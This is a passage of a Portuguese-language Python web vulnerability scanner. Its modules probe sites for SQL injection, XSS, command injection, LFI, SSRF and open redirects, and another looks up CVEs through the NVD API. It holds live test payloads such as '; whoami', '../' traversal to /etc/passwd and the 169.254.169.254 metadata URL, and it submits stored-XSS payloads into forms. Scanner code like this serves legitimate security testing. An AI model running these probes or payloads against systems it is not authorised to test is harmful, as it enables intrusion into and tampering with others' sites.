            task_id = progress.add_task("[green]Testando SQL Injection...", total=len(tasks))
            for method, url, param, value, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] em {url[:50]}...")
                self._test_param(url, param, value, method, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        """Apresenta os resultados do scan de SQLi com estatísticas detalhadas."""
        console.print("\n[bold cyan]═══ RESULTADOS DO SCAN ═══[/bold cyan]")
        
        # Estatísticas do scan
        stats_table = Table(title="Estatísticas do Scan", show_header=True, header_style="bold yellow")
        stats_table.add_column("Métrica", style="cyan", width=25)
        stats_table.add_column("Valor", style="yellow", width=15)
        stats_table.add_column("Descrição", style="white", width=30)
        
        stats_table.add_row("Testes Realizados", str(self.statistics['total_tests']), "Total de parâmetros testados")
        stats_table.add_row("Vulnerabilidades", str(self.statistics['vulnerabilities_found']), "SQLi encontradas")
        stats_table.add_row("Confirmadas", str(self.statistics['confirmed_vulns']), "Vulnerabilidades confirmadas")
        stats_table.add_row("Falsos Positivos", str(self.statistics['false_positives_filtered']), "Filtrados pela confirmação")
        
        if self.waf_detected:
            stats_table.add_row("WAF Detectado", self.waf_detected.upper(), "Firewall de aplicação web")
            stats_table.add_row("Bypasses WAF", str(self.statistics['waf_bypasses']), "Técnicas que passaram pelo WAF")
        
        if self.db_fingerprint:
            stats_table.add_row("Banco Identificado", self.db_fingerprint.upper(), "Sistema de banco de dados")
        
        console.print(stats_table)
        console.print()
        
        # Resultados de vulnerabilidades
        if not self.vulnerable_points:
            console.print("[bold green]✅ NENHUMA VULNERABILIDADE ENCONTRADA[/bold green]")
            console.print("[green]O site aparenta estar protegido contra SQL Injection[/green]")
        else:
            console.print(f"[bold red]🚨 {len(self.vulnerable_points)} VULNERABILIDADE(S) ENCONTRADA(S)[/bold red]")
            
            vuln_table = Table(title="Vulnerabilidades de SQL Injection Detectadas", show_header=True, header_style="bold red")
            vuln_table.add_column("Risco", justify="center", style="bold red", width=8)
            vuln_table.add_column("Tipo", style="magenta", width=15)
            vuln_table.add_column("Localização", style="cyan", width=40)
            vuln_table.add_column("Técnica & Payload", style="yellow", width=50)
            vuln_table.add_column("Recomendação", style="white", width=35)
            
            for finding in self.vulnerable_points:
                vuln_table.add_row(
                    finding['Risco'],
                    finding['Tipo'], 
                    finding['Detalhe'],
                    finding['Recomendação'].split('.')[0] if '.' in finding['Recomendação'] else finding['Recomendação'][:50],
                    "Usar prepared statements e validação de entrada"
                )
            
            console.print(vuln_table)
            
            # Recomendações gerais
            console.print("\n[bold yellow]🛡️  RECOMENDAÇÕES DE SEGURANÇA:[/bold yellow]")
            recommendations = [
                "1. Use prepared statements/parametrized queries",
                "2. Implemente validação rigorosa de entrada",
                "3. Configure um WAF (Web Application Firewall)",
                "4. Aplique o princípio do menor privilégio no banco",
                "5. Mantenha o sistema de banco atualizado"
            ]
            for rec in recommendations:
                console.print(f"   [white]{rec}[/white]")
        
        console.print(f"\n[bold cyan]{'═' * 60}[/bold cyan]")

def sql_injection_scan(url, level=1, dbms=None):
    SQLiScanner(url, level=level, dbms=dbms).run_scan()

# --- MÓDULO 15: SCANNER DE XSS (CROSS-SITE SCRIPTING) MELHORADO ---

class XSSScanner:
    def __init__(self, base_url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = self._load_payloads(custom_payloads_file)
        self.scan_stored = scan_stored
        self.fuzz_dom = fuzz_dom # Placeholder for future implementation

    def _load_payloads(self, custom_payloads_file):
        """Carrega payloads de um ficheiro ou usa um payload padrão."""
        default_payload = "<script>alert('xss-test-spectra')</script>"
        if custom_payloads_file:
            try:
                with open(custom_payloads_file, 'r', errors='ignore') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                    if not payloads:
                        console.print(f"[bold yellow]Aviso: O ficheiro de payloads '{custom_payloads_file}' está vazio. Usando payload padrão.[/bold yellow]")
                        return [default_payload]
                    console.print(f"[*] Carregados [bold cyan]{len(payloads)}[/bold cyan] payloads de XSS de '{custom_payloads_file}'.")
                    return payloads
            except FileNotFoundError:
                console.print(f"[bold red][!] Erro: O ficheiro de payloads '{custom_payloads_file}' não foi encontrado. Usando payload padrão.[/bold red]")
                return [default_payload]
        return [default_payload]

    def _add_finding(self, risk, v_type, detail, recommendation):
        """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado."""
        # Verifica se uma descoberta para este 'detalhe' já existe
        for i, finding in enumerate(self.vulnerable_points):
            if finding["Detalhe"] == detail:
                # Se a nova descoberta for "Armazenado" e a existente não for, atualiza-a.
                if v_type == "XSS Armazenado" and finding["Tipo"] != "XSS Armazenado":
                    self.vulnerable_points[i].update({
                        "Risco": "Alto",
                        "Tipo": "XSS Armazenado",
                        "Recomendação": recommendation
                    })
                return  # Evita adicionar uma duplicada

        # Se não houver correspondência, adiciona a nova descoberta
        self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})

    def _scan_reflected(self, tasks, progress):
        """Executa o scan para XSS Refletido."""
        task_id = progress.add_task("[green]Testando XSS Refletido...", total=len(tasks))
        for method, url, param, form_data in tasks:
            progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan] (Refletido)...")
            for payload in self.payloads:
                test_data = {param: payload}
                try:
                    if method.lower() == 'get':
                        response = self.session.get(url, params=test_data, timeout=7, verify=False)
                    else: # POST
                        post_payload = (form_data or {}).copy()
                        post_payload[param] = payload
                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)

                    if payload in response.text:
                        detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
                        rec = f"Payload '{payload}' foi refletido sem sanitização."
                        self._add_finding("Médio", "XSS Refletido", detail, rec)
                        break  # Encontrado um payload funcional, passa para o próximo parâmetro
                except requests.RequestException:
                    pass
        progress.remove_task(task_id)

    def _inject_into_forms(self, forms, progress):
        """Submete payloads em todos os formulários encontrados."""
        num_fields = sum(len(form.find_all(['input', 'textarea'], {'name': True})) for form in forms)
        if num_fields == 0:
            return
            
        submission_task = progress.add_task("[green]Submetendo payloads (Stored XSS)...", total=num_fields * len(self.payloads))
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            if method != 'post':
                progress.update(submission_task, advance=len(self.payloads) * len(form.find_all(['input', 'textarea'], {'name': True})))
                continue

            form_fields = [i.get('name') for i in form.find_all(['input', 'textarea'], {'name': True})]
            
            for field in form_fields:
                for payload in self.payloads:
                    progress.update(submission_task, advance=1)
                    # Cria um payload base com valores de teste para todos os campos
                    base_data = {f: 'test' for f in form_fields}
                    # Substitui o campo atual pelo payload
                    base_data[field] = payload
                    try:
                        self.session.post(action, data=base_data, timeout=7, verify=False)
                    except requests.RequestException:
                        continue
        progress.remove_task(submission_task)

    def _verify_storage(self, progress):
        """Rasteia o site para verificar a persistência dos payloads."""
        crawl_task = progress.add_task("[green]Verificando páginas para Stored XSS...", total=None)
        
        to_visit = [self.base_url]
        visited = set()
        
        while to_visit:
            current_url = to_visit.pop(0)
            if current_url in visited:
                continue
            visited.add(current_url)
            progress.update(crawl_task, advance=1, description=f"Verificando {current_url[:60]}...")

            try:
                response = self.session.get(current_url, timeout=7, verify=False)
                # Usar BeautifulSoup para lidar melhor com diferentes codificações
                soup = BeautifulSoup(response.content, 'html.parser', from_encoding=response.encoding)
                page_text = soup.get_text()

                for payload in self.payloads:
                    if payload in response.text or payload in page_text:
                        # Se o payload for encontrado, tenta encontrar uma descoberta de XSS Refletido correspondente para atualizar
                        # Esta é uma heurística; pode não identificar o parâmetro exato, mas atualiza o tipo de vulnerabilidade
                        found_and_upgraded = False
                        for finding in self.vulnerable_points:
                            if payload in finding["Recomendação"]:
                                self._add_finding("Alto", "XSS Armazenado", finding["Detalhe"], f"Payload '{payload}' foi submetido e persistiu na aplicação.")
                                found_and_upgraded = True
                        
                        if not found_and_upgraded:
                            detail = f"Payload persistiu e foi encontrado em {current_url}"
                            self._add_finding("Alto", "XSS Armazenado", detail, f"Payload '{payload}' foi submetido e persistiu na aplicação.")

                base_netloc = urlparse(self.base_url).netloc
                for link_tag in soup.find_all('a', href=True):
                    link = urljoin(self.base_url, link_tag['href'])
                    if urlparse(link).netloc == base_netloc and link not in visited:
                        to_visit.append(link)
            except (requests.RequestException, UnicodeDecodeError):
                continue
        progress.remove_task(crawl_task)

    def run_scan(self, return_findings=False):
        """Orquestra os diferentes tipos de scans de XSS."""
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de XSS em: [bold cyan]{self.base_url}[/bold cyan]")
            if self.scan_stored: console.print("[*] Modo XSS Armazenado: [bold green]Ativado[/bold green]")
            if self.fuzz_dom: console.print("[*] Modo XSS DOM: [bold yellow]Ativado (Funcionalidade Futura)[/bold yellow]")
            console.print("-" * 60)

        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        # Coleta de tarefas (pontos de entrada)
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea'], {'name': True})}
            for param in data: tasks.append((method, action, param, data))
        
        if not tasks and not forms:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada (parâmetro ou formulário) encontrado para testar XSS.[/yellow]")
            return [] if return_findings else None
        
        # Execução dos scans
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), console=console, transient=return_findings) as progress:
            # 1. Scan de XSS Refletido
            self._scan_reflected(tasks, progress)

            # 2. Scan de XSS Armazenado (se ativado)
            if self.scan_stored:
                post_forms = [form for form in forms if form.get('method', 'get').lower() == 'post']
                if post_forms:
                    self._inject_into_forms(post_forms, progress)
                    self._verify_storage(progress)
        
        if self.fuzz_dom:
            console.print("[yellow]Aviso: A análise de XSS baseado em DOM (`--fuzz-dom`) ainda não está implementada.[/yellow]")

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        """Apresenta os resultados do scan de XSS."""
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de XSS foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de XSS Encontradas")
            table.add_column("Risco", style="cyan")
            table.add_column("Tipo", style="yellow")
            table.add_column("Detalhe", style="magenta")
            table.add_column("Recomendação", style="white")
            
            risk_order = {"Alto": 0, "Médio": 1, "Baixo": 2}
            sorted_findings = sorted(self.vulnerable_points, key=lambda x: risk_order.get(x["Risco"], 99))

            for f in sorted_findings:
                risk_style = "red" if f['Risco'] == 'Alto' else "yellow"
                table.add_row(f"[{risk_style}]{f['Risco']}[/{risk_style}]", f['Tipo'], f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def xss_scan(url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False):
    XSSScanner(url, custom_payloads_file=custom_payloads_file, scan_stored=scan_stored, fuzz_dom=fuzz_dom).run_scan()

# --- MÓDULO 16: SCANNER DE INJEÇÃO DE COMANDOS ---

class CommandInjectionScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = ["; whoami", "&& whoami", "| whoami", "; dir", "&& dir", "| dir"]

    def _scan_target(self, url, method, param, form_data=None):
        for payload in self.payloads:
            try:
                test_data = {param: payload}
                if method.lower() == 'get': response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else:
                    post_payload = form_data.copy()
                    post_payload[param] = payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                
                if re.search(r'root|nt authority|system|\<dir\>', response.text, re.I) or 'total' in response.text:
                    finding = {"Risco": "Crítico", "Tipo": "Injeção de Comandos", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"Payload '{payload}' parece ter sido executado. Investigação manual urgente."}
                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
                    return
            except requests.RequestException: pass

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de Injeção de Comandos em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data: tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum ponto de entrada encontrado para testar Injeção de Comandos.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando Injeção de Comandos...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de Injeção de Comandos foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de Injeção de Comandos Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def command_injection_scan(url):
    CommandInjectionScanner(url).run_scan()

# --- MÓDULO 17: SCANNER DE LFI (LOCAL FILE INCLUSION) ---

class LFIScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = {"/etc/passwd": "root:x:0:0", "c:\\boot.ini": "[boot loader]"}

    def _scan_target(self, url, method, param, form_data=None):
        for path, signature in self.payloads.items():
            for i in range(8):
                payload = "../" * i + path
                try:
                    test_data = {param: payload}
                    if method.lower() == 'get': response = self.session.get(url, params=test_data, timeout=7, verify=False)
                    else:
                        post_payload = form_data.copy()
                        post_payload[param] = payload
                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                    
                    if signature in response.text:
                        finding = {"Risco": "Alto", "Tipo": "Local File Inclusion (LFI)", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"Payload '{payload}' retornou a assinatura de um ficheiro de sistema."}
                        if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
                        return
                except requests.RequestException: continue

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de LFI em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        common_params = ['file', 'page', 'include', 'path', 'document', 'img']
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro comum de LFI encontrado para testar.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando LFI...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de LFI foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de LFI Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def lfi_scan(url):
    LFIScanner(url).run_scan()

# --- MÓDULO 18: SCANNER DE SSRF (SERVER-SIDE REQUEST FORGERY) ---

class SSRFScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payloads = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/"]

    def _scan_target(self, url, method, param, form_data=None):
        for payload in self.payloads:
            try:
                test_data = {param: payload}
                if method.lower() == 'get': response = self.session.get(url, params=test_data, timeout=7, verify=False)
                else:
                    post_payload = form_data.copy()
                    post_payload[param] = payload
                    response = self.session.post(url, data=post_payload, timeout=7, verify=False)
                
                if "It works!" in response.text or "Apache" in response.text or "instance-id" in response.text:
                    finding = {"Risco": "Alto", "Tipo": "Server-Side Request Forgery (SSRF)", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"Payload '{payload}' parece ter acedido a um recurso local. Investigar imediatamente."}
                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
                    return
            except requests.RequestException: continue

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de SSRF em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        common_params = ['url', 'redirect', 'next', 'page', 'file', 'image_url', 'uri']
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro comum de SSRF encontrado para testar.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando SSRF...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de SSRF foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de SSRF Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def ssrf_scan(url):
    SSRFScanner(url).run_scan()

# --- MÓDULO 19: SCANNER DE OPEN REDIRECT ---

class OpenRedirectScanner:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        self.vulnerable_points = []
        self.payload = "http://example.com"

    def _scan_target(self, url, method, param, form_data=None):
        try:
            test_data = {param: self.payload}
            if method.lower() == 'get':
                response = self.session.get(url, params=test_data, timeout=7, verify=False, allow_redirects=False)
            else:
                post_payload = form_data.copy()
                post_payload[param] = self.payload
                response = self.session.post(url, data=post_payload, timeout=7, verify=False, allow_redirects=False)
            
            if response.status_code in [301, 302, 303, 307, 308] and 'Location' in response.headers:
                if "example.com" in response.headers['Location']:
                    finding = {"Risco": "Médio", "Tipo": "Open Redirect", "Detalhe": f"Parâmetro '{param}' em {url} ({method.upper()})", "Recomendação": f"A aplicação redireciona para um URL externo ('{self.payload}') sem validação."}
                    if finding not in self.vulnerable_points: self.vulnerable_points.append(finding)
        except requests.RequestException: pass

    def run_scan(self, return_findings=False):
        if not return_findings:
            console.print("-" * 60)
            console.print(f"[*] Executando scanner de Open Redirect em: [bold cyan]{self.base_url}[/bold cyan]")
            console.print("-" * 60)
        try:
            with console.status("[bold green]Coletando pontos de entrada...[/bold green]"):
                response = self.session.get(self.base_url, timeout=10, verify=False)
                soup = BeautifulSoup(response.content, 'html.parser')
        except requests.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Não foi possível aceder à página inicial: {e}[/bold red]")
            return [] if return_findings else None

        common_params = ['url', 'redirect', 'next', 'goto', 'return', 'dest']
        tasks = []
        links = {urljoin(self.base_url, a['href']) for a in soup.find_all('a', href=True) if '?' in a['href'] and '=' in a['href']}
        for link in links:
            parsed = urlparse(link)
            base = urlunparse(parsed._replace(query=""))
            for param in parse_qs(parsed.query):
                if any(p in param.lower() for p in common_params): tasks.append(('get', base, param, None))

        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(self.base_url, form.get('action', ''))
            method = form.get('method', 'post').lower()
            data = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea']) if i.get('name')}
            for param in data:
                if any(p in param.lower() for p in common_params): tasks.append((method, action, param, data))
        
        if not tasks:
            if not return_findings: console.print("[yellow]Nenhum parâmetro comum de Open Redirect encontrado para testar.[/yellow]")
            return [] if return_findings else None

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console, transient=return_findings) as progress:
            task_id = progress.add_task("[green]Testando Open Redirect...", total=len(tasks))
            for method, url, param, form_data in tasks:
                progress.update(task_id, advance=1, description=f"[green]Testando [cyan]{param}[/cyan]...")
                self._scan_target(url, method, param, form_data)

        if return_findings: return self.vulnerable_points
        self._present_findings()

    def _present_findings(self):
        console.print("-" * 60)
        if not self.vulnerable_points:
            console.print("[bold green][+] Nenhuma vulnerabilidade de Open Redirect foi encontrada.[/bold green]")
        else:
            table = Table(title="Potenciais Vulnerabilidades de Open Redirect Encontradas")
            table.add_column("Detalhe", style="cyan")
            table.add_column("Recomendação", style="white")
            for f in self.vulnerable_points: table.add_row(f['Detalhe'], f['Recomendação'])
            console.print(table)
        console.print("-" * 60)

def open_redirect_scan(url):
    OpenRedirectScanner(url).run_scan()

# --- MÓDULO 20: SCANNER DE CVE (API NVD OFICIAL) ---

def _load_cve_cache():
    """Carrega o cache de CVEs a partir de um ficheiro JSON."""
    if not os.path.exists(CVE_CACHE_FILE):
        return {}
    try:
        with open(CVE_CACHE_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}

def _save_cve_cache(cache):
    """Guarda o cache de CVEs num ficheiro JSON."""
    try:
        if not os.path.exists(CACHE_DIR):
            os.makedirs(CACHE_DIR)
        with open(CVE_CACHE_FILE, 'w') as f:
            json.dump(cache, f, indent=4)
    except IOError:
        console.print("[bold red][!] Aviso: Não foi possível guardar o cache de CVEs.[/bold red]")

def _get_cvss_score(vuln):
    """Extrai a melhor pontuação CVSS disponível de uma vulnerabilidade NVD."""
    try:
        # Prioriza CVSS v3.1
        return vuln['cve']['metrics']['cvssMetricV31'][0]['cvssData']['baseScore']
    except (KeyError, IndexError):
        try:
            # Fallback para CVSS v2
            return vuln['cve']['metrics']['cvssMetricV2'][0]['cvssData']['baseScore']
        except (KeyError, IndexError):
            return 0.0

def cve_scan(product, version, min_cvss=0.0, no_cache=False, return_findings=False):
    """Procura por vulnerabilidades (CVEs) usando a API oficial da NVD."""
    if not return_findings:
        console.print("-" * 60)
        console.print(f"[*] Procurando CVEs para: [bold cyan]{product} v{version}[/bold cyan] (via NVD API)")
        if min_cvss > 0:
            console.print(f"[*] Filtro: CVSS >= [bold yellow]{min_cvss}[/bold yellow]")
        if no_cache:
            console.print("[yellow]Aviso: O cache está a ser ignorado (--no-cache).[/yellow]")
        console.print("-" * 60)

    cache = _load_cve_cache()
    # Assume que o vendor é igual ao produto para simplificar a criação do CPE
    vendor = product
    cpe_name = f"cpe:2.3:a:{vendor}:{product}:{version}"
    cache_key = cpe_name
    
    data = None
    if not no_cache and cache_key in cache:
        cached_time = datetime.fromisoformat(cache[cache_key]['timestamp'])
        if datetime.now() - cached_time < timedelta(hours=CACHE_DURATION_HOURS):
            if not return_findings:
                console.print("[green]✓ Usando resultados do cache.[/green]")
            data = cache[cache_key]['data']

    if data is None:
        # A NVD API pode ser lenta, então um timeout maior é prudente
        api_url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cpeName={cpe_name}"
        api_succeeded = False
        try:
            if not return_findings:
                with console.status(f"[bold green]Consultando a API da NVD... (Pode demorar um pouco)[/bold green]"):
                    # A API da NVD pode demorar, um timeout de 30s é mais seguro
                    response = requests.get(api_url, timeout=30)
            else:
                response = requests.get(api_url, timeout=30)
            
            if response.status_code == 200:
                if not return_findings:
                    console.print(f"[bold green]✓ API NVD contactada com sucesso (Status: {response.status_code})[/bold green]")
            else:
                if not return_findings:
                    console.print(f"[bold red][!] Falha ao contactar a API NVD (Status: {response.status_code})[/bold red]")
                    try:
                        # Tenta mostrar a mensagem de erro da API, se houver
                        error_data = response.json()
                        console.print(f"[red]   Detalhe: {error_data.get('message', response.text)}[/red]")
                    except json.JSONDecodeError:
                        pass # Não faz nada se a resposta de erro não for JSON
                response.raise_for_status()

            json_response = response.json()
            data = json_response.get('vulnerabilities', [])
            
            if data and not return_findings:
                console.print(f"[bold green]✓ {len(data)} registo(s) recebido(s) da API. A processar...[/bold green]")

            api_succeeded = True
            
        except requests.exceptions.RequestException as e:
            if not return_findings: console.print(f"[bold red][!] Erro de rede ao consultar a API da NVD: {e}[/bold red]")
            return []
        except json.JSONDecodeError:
            if not return_findings: console.print(f"[bold red][!] Erro: A resposta da API da NVD não é um JSON válido.[/bold red]")
            return []
        finally:
            if api_succeeded:
                cache[cache_key] = {'timestamp': datetime.now().isoformat(), 'data': data}
                _save_cve_cache(cache)

    if not data:
        if not return_findings: console.print("[bold yellow][-] Nenhuma CVE encontrada para esta versão na base de dados da NVD.[/bold yellow]")
        return []

    findings = []
    if not return_findings:
        table = Table(title=f"CVEs Encontradas para {product} v{version}")
        table.add_column("CVE ID", style="yellow", no_wrap=True)
        table.add_column("CVSS", style="magenta", justify="center")
        table.add_column("Publicado em", style="blue")
        table.add_column("Resumo", style="white")
    
    for vuln in data:
        cvss = _get_cvss_score(vuln)
        
        if cvss >= min_cvss:
            cve_id = vuln['cve']['id']
            summary = vuln['cve']['descriptions'][0]['value']
            published_date = vuln['cve']['published'].split('T')[0]
            
            if return_findings:
                findings.append({"ID": cve_id, "CVSS": cvss, "Resumo": summary, "Produto": product, "Versão": version, "Data": published_date})
            else:
                risk_color = "red" if cvss >= 7.0 else "yellow" if cvss >= 4.0 else "green"
                link = f"https://nvd.nist.gov/vuln/detail/{cve_id}"
                cve_id_text = Text(cve_id, style=f"link {link}")
                table.add_row(cve_id_text, f"[{risk_color}]{cvss:.1f}[/{risk_color}]", published_date, summary)

    if not return_findings:
        if table.row_count > 0:
            console.print(table)
        else:
